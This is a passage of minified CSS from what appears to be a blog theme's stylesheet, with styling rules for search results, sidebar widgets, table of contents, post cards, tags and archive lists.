var(--alpha100); } .search-wrapper #search-result li+li { margin-top: 8px; } .search-wrapper #search-result .search-result-title { color: var(--text-p1); font-weight: 700; font-size: 0.9375rem; } .search-wrapper #search-result .search-result-content { overflow: hidden; color: var(--text-p3); margin: 4px 0 0; max-height: 13em; text-align: justify; font-size: 0.8125rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .search-wrapper #search-result .search-keyword { color: #f44336; border-bottom: 1px dashed #f44336; font-weight: bold; filter: grayscale(25%); } .search-wrapper.noresult[searching='true'] .search-no-result { display: block; margin-bottom: 8px; } .l_left { margin: 8px; height: calc(100vh - 16px); border-radius: 16px; overflow: hidden; overflow: clip; overflow-clip-margin: 0.5px; } .l_left .header { margin: var(--gap-max) var(--gap-margin) 0; } .l_right { margin: 8px; border-radius: 16px; } @media screen and (min-width: 2048px) { .l_left { margin-left: auto; margin-right: calc(2 * var(--gap-max)); } .l_right { margin-left: var(--gap-max); margin-right: auto; } } .l_left { background-size: cover; background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.13/image/sidebar-bg1@small.jpg\"); } .l_left .leftbar-container { height: 100%; display: flex; flex-direction: column; word-break: break-all; text-align: justify; --blur-px: 100px; --blur-bg: var(--alpha60); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .l_left .leftbar-container { background: var(--blur-bg); backdrop-filter: saturate(240%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(240%) blur(var(--blur-px)); } } .widget-body .linklist { display: grid; grid-gap: 8px; } .linklist .link { border-radius: 8px; color: var(--text-p2); min-height: 32px; padding: 0 4px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; display: flex; justify-content: center; align-items: center; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .linklist .link.active { background: var(--alpha50); } .linklist .link.active svg, .linklist .link.active img { filter: unset; } .linklist .link span { padding: 0 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .linklist .link svg, .linklist .link img { padding: 0 2px; max-height: 18px; width: auto; filter: grayscale(100%) brightness(0.8) opacity(0.8); transition: filter 0.2s ease-out; -moz-transition: filter 0.2s ease-out; -webkit-transition: filter 0.2s ease-out; -o-transition: filter 0.2s ease-out; flex-shrink: 0; } .linklist .link svg:not([class='active-icon']), .linklist .link img:not([class='active-icon']) { color: #1cd0fd; } .widget-body .linklist.left { grid-gap: 2px; } .linklist.left .link { justify-content: space-between; padding: 0 16px; } .linklist.left .link img, .linklist.left .link svg { width: 1em; height: 1em; transform: scale(1.2); } .linklist.left .link span { padding: 0 8px; } .linklist .link:hover { background: var(--alpha100); } .linklist .link:hover svg { filter: unset; } .widget-wrapper.ghrepo .repo { display: block; padding: 0.75rem 0.5rem; color: var(--text-p2); background: var(--card); border-radius: 12px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } :root[data-theme=\"light\"] .widget-wrapper.ghrepo .repo { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .widget-wrapper.ghrepo .repo { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .widget-wrapper.ghrepo .repo >div+div { margin-top: 0.5rem; } .widget-wrapper.ghrepo .repo span { color: var(--text-p2); } .widget-wrapper.ghrepo .repo svg { margin-right: 4px; } .widget-wrapper.ghrepo .repo .flex-row { display: flex; align-items: center; } .widget-wrapper.ghrepo .repo .repo-name { font-size: 0.875rem; font-weight: 700; color: var(--text-p1); } .widget-wrapper.ghrepo .repo .repo-desc { font-size: 0.8125rem; margin-left: 2px; margin-right: 2px; } .widget-wrapper.ghrepo .repo .grid { font-size: 0.8125rem; display: grid; grid-gap: 2px; grid-template-columns: repeat(auto-fill, calc((100% - 2 * 2px) / 3)); } .widget-wrapper.user-card .widget-header+.widget-body { margin: 0.75rem 0; } .widget-wrapper.user-card .widget-body { text-align: center; background: var(--card); border-radius: 12px; padding: 1rem; box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } .widgets .widget-wrapper.user-card .avatar { display: block; border-radius: 100%; margin: 1rem auto 1.25rem auto; max-width: 128px; overflow: hidden; } .widgets .widget-wrapper.user-card .avatar img { display: block; aspect-ratio: 1; } @media screen and (max-width: 768px) { .widgets .widget-wrapper.user-card .avatar { max-width: 50%; } } .widgets .widget-wrapper.user-card p.username { font-weight: 900; font-size: calc(17px + 11px); color: var(--text); margin: 0; } .widgets .widget-wrapper.user-card p.bio { font-size: 0.8125rem; margin: 0; } .widgets .widget-wrapper.user-card .follow { font-weight: 500; border-radius: 64px; margin: 1rem 0 0; padding: 0.5rem 1rem; background: #1cd0fd; color: var(--card); font-size: 1rem; align-self: stretch; text-align: center; line-height: 1.5; display: flex; align-items: center; justify-content: center; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widgets .widget-wrapper.user-card .follow svg { margin-right: 6px; height: 1.5em; width: auto; } .widgets .widget-wrapper.user-card .follow:hover { background: #ff5724; } .widgets .widget-wrapper.user-card .buttons { margin: 1rem 0; align-self: stretch; display: grid; grid-gap: 2px; grid-template-columns: repeat(auto-fill, calc((100% - 2 * 2px) / 3)); } .widgets .widget-wrapper.user-card .btn { display: flex; flex-direction: column; align-items: center; color: inherit; border: 1px solid transparent; border-radius: 4px; padding: 0.25rem 0; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widgets .widget-wrapper.user-card .btn:hover { background: var(--block); } .widgets .widget-wrapper.user-card .btn .title { font-size: 1rem; font-weight: 700; } .widgets .widget-wrapper.user-card .btn .desc { font-size: 0.75rem; color: var(--text-p3); font-weight: 500; } .widget-wrapper.post-list .widget-body a { font-size: 0.875rem; padding: 8px 16px; display: block; border-radius: 8px; color: var(--text-p1); transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widget-wrapper.post-list .widget-body a.active { background: var(--alpha50); } .widget-wrapper.post-list .widget-body a:hover { background: var(--alpha100); } .widget-wrapper.post-list .widget-body a+a { margin-top: 2px; } .widget-wrapper.post-list .widget-body a { display: flex; justify-content: space-between; align-items: center; } .widget-wrapper.post-list .widget-body a .title { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .widget-wrapper.post-list .widget-body a svg { flex-shrink: 0; height: 1em; width: auto; transform: scale(1.2); } .widget-wrapper.post-list .widget-body+.widget-header { margin-top: 28px; } .widget-wrapper.markdown .widget-body { border-radius: 12px; padding: 4px 16px; background: var(--alpha50); } .widget-wrapper.markdown .widget-body a:not([class]) { transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; border-bottom: 1px solid var(--text); color: var(--text); } .widget-wrapper.markdown .widget-body a:not([class]):hover { color: #ff5724; border-bottom: 1px solid #ff5724; } .widget-wrapper.markdown .linklist { margin: 1em 0; } .widget-wrapper.markdown .linklist .link { background: var(--alpha50); } .widget-wrapper.markdown .linklist .link:hover { background: var(--alpha100); } .widget-wrapper.post-card .widget-body { max-width: 100%; } .widget-wrapper.post-card .widget-body .item+.item { margin-top: 8px; } .widget-wrapper.post-card .widget-body .item { line-height: 1.2; background: var(--alpha20); padding: 10px 16px; border-radius: 12px; display: block; border-left: 0; box-sizing: border-box; } .widget-wrapper.post-card .widget-body .title { color: var(--text-p1); font-weight: 500; font-size: 1rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 1; font-weight: 700; font-size: 0.875rem; } .widget-wrapper.post-card .widget-body .excerpt { color: var(--text-p3); font-size: 0.75rem; margin-top: 0.5rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .widget-wrapper.post-card .widget-body .item { transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widget-wrapper.post-card .widget-body .item.active { background: var(--alpha50); } .widget-wrapper.post-card .widget-body .item:hover { background: var(--alpha50); } .widget-wrapper.tagcloud .widget-body { border-radius: 12px; padding: 12px 16px; background: var(--alpha50); } .widget-wrapper.tagcloud .widget-body a { word-break: break-word; color: var(--text-p2); line-height: 1.5; } .widget-wrapper.tagcloud .widget-body a:hover { color: #ff5724; } .widget-wrapper.timeline .tag-plugin.timeline { padding-left: 0; } .widget-wrapper.timeline .tag-plugin.timeline:before { left: 6px; } .widget-wrapper.timeline .widget-body { overflow: hidden; } .widget-wrapper.timeline .body a { transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; word-break: break-all; --fsp: calc(17px - 2px); } .widget-wrapper.timeline .tag-plugin.timeline .timenode { z-index: 1; margin-top: 0.25rem; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header { margin: 0.25rem var(--gap-padding); } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header .user-info { background: none; padding-right: 0; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header img { display: none; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header:before { left: calc(6px - var(--gap-padding)); } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body { border-radius: 12px; padding: 0.5rem 1rem; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body p, .widget-wrapper.timeline .tag-plugin.timeline .timenode .body li { --fsp: calc(17px - 3px); } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body code { background: none; padding: 0; margin: 0; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body .highlight, .widget-wrapper.timeline .tag-plugin.timeline .timenode .body pre:not([class]):has(>code) { background: var(--alpha50); } .widget-wrapper.timeline .tag-plugin.timeline[api] .body .footer { background: none; } .l_left .widget-wrapper.timeline .tag-plugin.timeline { padding-left: 0; } .l_left .widget-wrapper.timeline .tag-plugin.timeline:before { content: none; } .l_left .widget-wrapper.timeline .body { box-shadow: none; background: var(--alpha50); } .widget-wrapper.toc { background: var(--site-bg); z-index: 3; } .widget-wrapper.toc .widget-body { position: relative; } .widget-wrapper.toc .widget-body:before { content: ''; position: absolute; top: 6px; bottom: 6px; left: 0; width: 4px; background: var(--block); border-radius: 4px; } .widget-wrapper.toc .toc { --fsp: calc(17px - 2px); padding: 0; margin: 0; position: relative; list-style: none; } .widget-wrapper.toc .toc li { margin: 0; list-style: none; } .widget-wrapper.toc .toc a { --padding: calc(var(--gap-padding) / 2); --padding-offset: calc(0 - var(--padding)); padding: 6px var(--padding); margin: 0 var(--padding); color: var(--text-p3); display: block; position: relative; border-radius: 8px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } .widget-wrapper.toc .toc a.active:before { content: ''; position: absolute; top: 6px; bottom: 6px; left: -8px; width: 4px; background: #1cd0fd; border-radius: 4px; } .widget-wrapper.toc .toc a:hover { background: var(--block-hover); color: var(--text); } .l_right .widgets .widget-wrapper.toc { margin-top: 0; position: sticky; position: -webkit-sticky; top: 0; padding: 16px 0; } .l_right .widgets .widget-wrapper.toc:first-child { top: 8px; padding-top: 8px; } .l_right .widgets .widget-wrapper.toc .widget-body .toc { max-height: 70vh; overflow: auto; } @media screen and (max-width: 1180px) { .l_right .widgets .widget-wrapper.toc .widget-body .toc { max-height: unset; } } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar { height: 0; width: 0; } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar-track-piece { background: transparent; } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .widget-wrapper.toc .toc .toc-item { font-weight: 500; --fsp: calc(17px - 1px); } .widget-wrapper.toc .toc .toc-item .toc-item { font-weight: 400; --fsp: calc(17px - 2px); } .widget-wrapper.toc .toc ol { padding-left: 0; } .widget-wrapper.toc .toc .toc-child .toc-link { padding-left: 1.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-link { padding-left: 2.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-child .toc-link { padding-left: 3.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-child .toc-child .toc-link { padding-left: 4.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-child .toc-child .toc-child .toc-link { padding-left: 5rem; } .widget-wrapper.toc .toc a.toc-link.active { color: var(--text); } .widget-wrapper.toc .toc a.toc-link.active:before, .widget-wrapper.toc .toc a.toc-link.active:after { content: ''; } .widget-wrapper.toc[collapse='true'] .toc-item a.toc-link+ol { display: none; } .widget-wrapper.toc[collapse='true'] .toc a.toc-link.active+ol { display: block; } .widget-wrapper.toc[collapse='auto'] .toc-item a.toc-link+ol { display: none; } .widget-wrapper.toc[collapse='auto'] .toc a.toc-link.active+ol { display: block; } .widget-wrapper.toc[collapse='auto']:hover a.toc-link+ol { display: block; } .widget-wrapper.toc[collapse='true'] ol:has(> .toc-item a.active) { display: block; } .widget-wrapper.toc[collapse='auto'] ol:has(> .toc-item a.active) { display: block; } .widget-wrapper.toc .widget-body { display: grid; grid-template-rows: 1fr; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; overflow: hidden; } .l_right .widgets .widget-wrapper.toc .widget-header .cap-action:hover { background: var(--block-border); } .l_right .widgets .widget-wrapper.toc.collapse .widget-header .cap-action { background: var(--block-border); } .l_right .widgets .widget-wrapper.toc.collapse .widget-body { grid-template-rows: 0fr; } .widget-wrapper.toc .widget-body+.widget-footer:before { content: ''; position: absolute; background: var(--block-border); top: 0; height: 1px; left: var(--gap-padding); right: var(--gap-padding); } .widget-wrapper.toc .widget-footer { margin-top: 8px; color: var(--text-p2); position: relative; padding-top: 8px; } .widget-wrapper.toc .widget-footer a { display: flex; align-items: center; color: inherit; font-size: 0.875rem; padding: 8px var(--gap-padding); border-radius: 8px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } .widget-wrapper.toc .widget-footer a svg, .widget-wrapper.toc .widget-footer a img { height: 16px; width: auto; margin-right: 8px; } .widget-wrapper.toc .widget-footer a:hover { background: var(--block-hover); color: var(--text); } .widget-wrapper.toc+.widget-wrapper { padding-top: 32px; } @media screen and (max-width: 1180px) { .l_right { background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .l_right { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } .l_right:hover { background: var(--card); } .l_right .widgets .widget-wrapper.toc { position: static; background: none; } .widget-wrapper.toc .toc a { color: var(--text-p2); } .widget-wrapper.toc .widget-footer a { background: var(--alpha100); } .widget-wrapper.toc .widget-footer a+a { margin-top: 4px; } } .widgets .loading-wrap { margin: 0.5rem 0; background: var(--alpha50); } .widgets { overflow: scroll; flex-grow: 1; scrollbar-width: none; z-index: 1; line-height: 1.2; margin: 0 var(--gap-margin); } .widgets::-webkit-scrollbar { height: 0; width: 0; } .widgets::-webkit-scrollbar-track-piece { background: transparent; } .widgets::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .widgets::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .widgets .widget-wrapper .widget-header { padding-left: var(--gap-padding); padding-right: var(--gap-padding); display: flex; justify-content: space-between; align-items: baseline; line-height: 28px; font-weight: 500; font-size: 0.8125rem; color: var(--text-p1); } .widgets .widget-wrapper .widget-header .item { display: block; } .widgets .widget-wrapper .widget-header >span { text-align: left; opacity: 0.6; } .widgets .widget-wrapper .widget-header:empty { display: none; } .widgets .widget-wrapper .widget-header .cap-action { line-height: 0; color: inherit; opacity: 0.6; transition: opacity 0.2s ease-out, background 0.2s ease-out; -moz-transition: opacity 0.2s ease-out, background 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out, background 0.2s ease-out; -o-transition: opacity 0.2s ease-out, background 0.2s ease-out; border-radius: 4px; padding: 6px; margin-right: -6px; } .widgets .widget-wrapper .widget-header .cap-action svg { height: 1em; width: auto; transform: scale(1.2); fill: var(--text-p2); } .widgets .widget-wrapper .widget-header .cap-action:hover { color: #ff5724; background: var(--alpha100); opacity: 1; } .widgets .widget-wrapper .widget-header .cap-action:hover svg { fill: #ff5724; } .widgets .widget-wrapper .widget-body { color: var(--text-p1); } .widgets .widget-wrapper .widget-body p { margin-top: 0.5em; margin-bottom: 0.5em; line-height: 1.5; } .widget-wrapper { display: block; padding-bottom: 32px; } .l_left .widgets .widget-wrapper:first-child { margin-top: 32px; } .l_right .widgets:empty { display: none; } .l_right .widgets .widget-wrapper .widget-header { padding-left: var(--gap-padding); padding-right: var(--gap-padding); } @media screen and (max-width: 1180px) { .l_right .widgets .widget-wrapper { margin-top: var(--gap-margin); border-radius: 12px; } } @media screen and (min-width: 1180px) { .l_right .widgets .widget-wrapper.markdown .widget-body { background: var(--block); } } .post-list #archive { padding: 1rem; } .post-list #archive .archive-header { display: inline-block; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-weight: 700; line-height: 1.2; margin-bottom: 0.5em; position: relative; padding: 4px 0; color: var(--text-p1); } .post-list #archive .archive-header:after { content: \"\"; position: absolute; height: 4px; bottom: 0; left: 0; right: 0; z-index: -1; border-radius: 4px; background: #1cd0fd; } .post-list #archive a.post { display: inline-flex; align-items: baseline; margin: 0.25rem 0; color: var(--text-p1); transition: color 0.2s ease-out, border 0.2s ease-out; -moz-transition: color 0.2s ease-out, border 0.2s ease-out; -webkit-transition: color 0.2s ease-out, border 0.2s ease-out; -o-transition: color 0.2s ease-out, border 0.2s ease-out; border-bottom: 1px dashed var(--text-meta); } .post-list #archive a.post time { font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; margin-right: 1em; font-weight: 700; flex-shrink: 0; color: var(--text-p4); } .post-list #archive a.post:hover { border-bottom: 1px solid #1cd0fd; color: var(--text); } .post-list #archive a.post:hover time { color: #1cd0fd; } .post-list #cats { padding: 0; } .post-list #cats a.cat { display: flex; padding: 0.5em 1rem; border-radius: 8px; color: var(--text-p2); align-items: center; justify-content: space-between; font-weight: 500; font-size: calc(17px - 2px); } .post-list #cats a.cat.child { padding-left: 2rem; } .post-list #cats a.cat span { display: flex; align-items: center; } .post-list #cats a.cat svg { height: 1em; width: auto; transform: scale(1.2); margin-right: 8px; } .post-list #cats a.cat .badge { font-weight: 700; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; opacity: 0.5; font-size: 0.75rem; } .post-list #cats a.cat:hover { background: var(--block-hover); color: var(--text); } .post-list #cats a.cat:hover .badge { opacity: 1; color: #1cd0fd; } .post-list #tags { display: flex; flex-wrap: wrap; padding: 0; margin: 0 -4px; } .post-list #tags a.tag { display: inline-flex; align-items: center; position: relative; color: var(--text-p2); margin: 4px; padding: 0.5em 0.75rem; border-radius: 4px; background: var(--block); font-size: 0.8125rem; font-weight: 500; } .post-list #tags a.tag:before { content: \"#\"; margin-left: -2px; margin-right: 2px; opacity: 0.4; } .post-list #tags a.tag:hover { color: var(--text); background: var(--block-hover); } .post-list #tags a.tag:hover:before { color: #1cd0fd; opacity: 1; } @media screen and (min-width: 500px) { .post-list.author #archive { padding: 1rem 0; } } .md-text.error-page { text-align: center; margin-top: 2rem; } .md-text.error-page img#error { width: 30vw; max-height: 150px; margin-bottom: 2rem; } .md-text.error-page h1 { font-size: 4rem; margin-bottom: 0; } .md-text.error-page p.what, .md-text.error-page p.why { margin: 0.5em; } .md-text.error-page p.why { font-size: 0.8125rem; } .md-text.error-page a#back { margin: 2rem 0; display: inline-block; background: #fdb62f; color: #000; border: 2px solid #000; } @media screen and (max-width: 768px) { .md-text.error-page { margin-top: 4rem; } } .md-text .tag-list { display: flex; flex-wrap: wrap; padding: 0; margin-top: 2rem; } .md-text .tag-list a.tag { display: inline-flex; align-items: center; position: relative; color: var(--text-p2); margin: 4px; padding: 0.5em 0.75rem; border-radius: 4px; background: var(--block); font-size: 0.8125rem; font-weight: 500; } .md-text .tag-list a.tag:before { content: \"#\"; margin-left: -2px; margin-right: 2px; opacity: 0.4; } .md-text .tag-list a.tag:hover { color: var(--text); background: var(--block-hover); } .md-text .tag-list a.tag:hover:before { color: #1cd0fd; opacity: 1; } .post-list .post-card .meta.cap .tag:before { content: \"#\"; margin-left: -2px; margin-right: 2px; opacity: 0.4; } .widget-body.tag-tree .tag-subtree > a > .tag-switcher-wrapper { width: 1.75rem; height: 0.875rem; display: flex; justify-content: end; align-items: center; } .widget-body.tag-tree .tag-subtree > a > .tag-switcher-wrapper:hover { color: #1cd0fd; } .widget-body.tag-tree .tag-subtree.parent-tag > a .tag-switcher { display: inline-block; height: 0.5rem; width: 0.5rem; border-width: 1px; border-style: none solid solid none; transform: translateX(-25%) rotate(-45deg); } .widget-body.tag-tree .tag-subtree.parent-tag.expanded > a .tag-switcher { transform: translateY(-25%) rotate(45deg); } .widget-body.tag-tree .tag-subtree.parent-tag > .tag-subtree { display: none; } .widget-body.tag-tree .tag-subtree.parent-tag.expanded > .tag-subtree { display: block; } .widget-body.tag-tree .tag-subtree .tagcon { font-size: smaller; opacity: 0.4; margin-right: 0.25rem; } .l_body { display: grid; grid-template-columns: 1fr minmax(200px, var(--width-main)) 1fr; grid-gap: var(--gap-margin); margin: auto; font-size: var(--fsp); } .l_body aside { z-index: 8; flex-shrink: 0; position: sticky; position: -webkit-sticky; --width-sidebar: calc(var(--gap-margin) * 2 + var(--gap-padding) * 2 + var(--side-content-width)); width: var(--width-sidebar); } .l_body .l_left { justify-self: right; top: 8px; } .l_body .l_right { justify-self: left; --gap-margin: 0px; max-height: calc(100% - 8px * 2); } .l_body .l_right .widgets { height: 100%; overflow: visible; } @media screen and (max-width: 1180px) { .l_body .l_right { --gap-margin: 16px; } .laptop-only { display: block !important; } .l_body .l_right { top: 8px; position: fixed; max-height: calc(100% - 8px * 2); transform: translateX(320px); transition: transform 0.38s ease-out; margin: 0; right: 8px; box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); z-index: 10; background: var(--site-bg); overflow: auto; --blur-bg: var(--alpha60); --blur-px: 50px; } .l_body .l_right::-webkit-scrollbar { height: 0; width: 0; } .l_body .l_right::-webkit-scrollbar-track-piece { background: transparent; } .l_body .l_right::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .l_body .l_right::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .l_body[rightbar] .l_right { transform: translateX(0px); } .l_body[rightbar] .main-mask { pointer-events: inherit; } } @media screen and (max-width: 667px) { .mobile-only { display: block !important; } .l_body { padding: 0; display: block; } .l_body .l_left { position: fixed; transform: translateX(-320px); transition: transform 0.38s ease-out; margin: 0; left: 8px; box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); z-index: 10; } .l_body .l_main { max-width: 100%; } .l_body[leftbar] .l_left { transform: translateX(0px); } .l_body[leftbar] .main-mask { opacity: 1; pointer-events: inherit; } } .main-mask { position: fixed; pointer-events: none; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.1); z-index: 9; opacity: 0; transition: opacity 0.2s ease-out; -moz-transition: opacity 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out; -o-transition: opacity 0.2s ease-out; } .l_main .post-list { margin: 1rem; } .l_main .post-list .post-title:first-child { margin-top: 0.5rem; } .l_main .post-list .post-title { font-weight: 500; margin: 1.25rem auto 0.75rem 0; line-height: 1.2; font-size: calc(17px + 4px); border-bottom: none; color: var(--text); transition: color 0.2s ease-out; -moz-transition: color 0.2s ease-out; -webkit-transition: color 0.2s ease-out; -o-transition: color 0.2s ease-out; } @media screen and (max-width: 500px) { .l_main .post-list .post-title { font-size: calc(17px + 2px); margin: 0.5rem 0; } } .l_main .post-list .wiki .post-title { margin-top: 0.5rem; } .post-list .post-card { display: block; margin: 1rem 0; border-radius: 12px; background: var(--card); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; overflow: hidden; z-index: 0; position: relative; } :root[data-theme=\"light\"] .post-list .post-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .post-list .post-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .post-list .post-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .post-list .post-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .post-list .post-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .post-list .post-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .post-list .post-card .excerpt { margin: 1rem 0; } @media screen and (max-width: 500px) { .post-list .post-card .excerpt { margin: 0.5rem 0; } } .post-list .post-card .excerpt >p { margin: 1rem 0; line-height: 1.5; } @media screen and (max-width: 500px) { .post-list .post-card .excerpt >p { margin: 0.5rem 0; } } .post-list .post-card .meta.cap { flex-wrap: wrap; margin: 0; line-height: 2; --fsp: calc(17px - 1px); font-size: var(--fsp); } .post-list .post-card .meta.cap, .post-list .post-card .meta.cap span { display: flex; align-items: center; } .post-list .post-card .meta.cap svg { height: 1em; width: auto; line-height: 0; transform: scale(1.2); margin-right: 8px; } .post-list .post-card .meta.cap >span+span { margin-left: 1.5rem; } .post-list .post-card .meta.cap span.pin img { object-fit: contain; } .post-list .post-card .meta.cap span.pin svg { color: #f44336; } .post-list.post .post-card:hover img { filter: brightness(50%); } .post-list .md-text { padding: 1rem; } @media screen and (max-width: 500px) { .post-list .md-text { padding: 0.5rem 1rem; } } .post-list .md-text p { color: var(--text-p2); font-size: 0.875rem; } .post-list .post-card .post-cover { overflow: hidden; width: calc(100% + 2 * 1rem); border-radius: 0; margin-left: -1rem; margin-top: -1rem; margin-right: -1rem; background: var(--block); } .post-list .post-card .post-cover:not(.lazy) { transition: transform 1s ease-out; -moz-transition: transform 1s ease-out; -webkit-transition: transform 1s ease-out; -o-transition: transform 1s ease-out; } .post-list .post-card .post-cover img { object-fit: cover; width: 100%; border-radius: 0; aspect-ratio: 2.4; } .post-list .post-card.post.photo .cover { position: relative; line-height: 0; } .post-list .post-card.post.photo .cover img { width: 100%; object-fit: cover; aspect-ratio: 2.4; } .post-list .post-card.post.photo .cover .cover-info { padding: 1.5rem 1rem; position: absolute; line-height: 1.2; width: calc(100% - 1rem * 2); --text-banner: #fff; color: var(--text-banner); } .post-list .post-card.post.photo .cover .cover-info[position=top] { top: 0; background-image: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0)); } .post-list .post-card.post.photo .cover .cover-info[position=bottom] { bottom: 0; background-image: linear-gradient(rgba(0,0,0,0), rgba(0,0,0,0.2)); } .post-list .post-card.post.photo .cover .cover-info div+div { margin-top: 4px; } .post-list .post-card.post.photo .cover .cover-info .cap { font-size: 0.8125rem; color: unset; } .post-list .post-card.post.photo .cover .cover-info .title { font-weight: 500; font-size: calc(17px + 7px); } @media screen and (max-width: 500px) { .post-list .post-card.post.photo .cover .cover-info { padding: 1rem; } .post-list .post-card.post.photo .cover .cover-info div+div { margin-top: 2px; } .post-list .post-card.post.photo .cover .cover-info .title { font-size: calc(17px + 4px); } .post-list .post-card.post.photo .cover .cover-info .cap { font-size: 0.75rem; } } .post-list .post-card.post.photo h2 { margin: 0.25rem 0; font-size: calc(17px + 4px); } .post-list .post-card.wiki article { display: flex; flex-wrap: wrap; transition: box-shadow 0.2s ease-out; -moz-transition: box-shadow 0.2s ease-out; -webkit-transition: box-shadow 0.2s ease-out; -o-transition: box-shadow 0.2s ease-out; justify-content: center; padding: 1rem 0.5rem; } .post-list .post-card.wiki article .preview { display: flex; margin: 1rem 3rem; align-items: center; } .post-list .post-card.wiki article .preview img { width: 96px; max-height: 96px; object-fit: contain; } .post-list .post-card.wiki article .preview img:not(.lazy) { transition: transform 0.75s ease-out; -moz-transition: transform 0.75s ease-out; -webkit-transition: transform 0.75s ease-out; -o-transition: transform 0.75s ease-out; } .post-list .post-card.wiki article .excerpt { margin: 1rem 